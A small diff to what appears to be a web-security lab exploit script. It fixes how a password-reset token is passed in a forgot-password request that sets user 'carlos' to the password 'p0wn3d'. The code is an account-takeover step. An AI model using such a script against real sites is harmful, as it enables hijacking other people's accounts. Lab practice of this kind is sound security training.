@@ -112,7 +112,7 @@ def change_password(session, url, token):
     response = session.post(
       f"{url}/forgot-password?temp-forgot-password-token={token}",
       data={
-        "temp-forgot-password-token": {token},
+        "temp-forgot-password-token": token,
         "username": "carlos",
         "new-password-1": "p0wn3d",
         "new-password-2": "p0wn3d"
